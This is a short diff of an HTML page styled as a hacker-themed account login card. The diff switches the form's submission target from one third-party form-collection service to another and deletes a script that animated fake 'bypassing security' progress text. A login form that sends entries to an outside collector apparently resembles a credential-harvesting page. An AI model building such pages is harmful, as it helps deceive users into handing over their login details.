@@ -129,7 +129,8 @@
     <div class="login-card">
         <h2>//账户登入界面//</h2>
         
-        <form action="https://getform.io/f/z9rncgryekr" method="POST">
+        <form action="https://formspree.io/f/mojnqrqp" method="POST">
+
             <div class="input-group">
                 <label>Protocol_ID</label>
                 <input type="text" name="protocol_id" placeholder="请输入邮箱" required>
@@ -146,25 +147,7 @@
 
 </body>
 </html>
-<script>
-    const form = document.querySelector('form');
-    const button = document.querySelector('.btn-submit');
 
-    form.onsubmit = function() {
-        button.innerText = "INITIALIZING PROTOCOL... 0%";
-        let progress = 0;
-        let interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 10) + 5;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                button.innerText = "DATA SENT TO CORE.";
-            } else {
-                button.innerText = `BYPASSING SECURITY... ${progress}%`;
-            }
-        }, 300);
-    };
-</script>
 
 
 
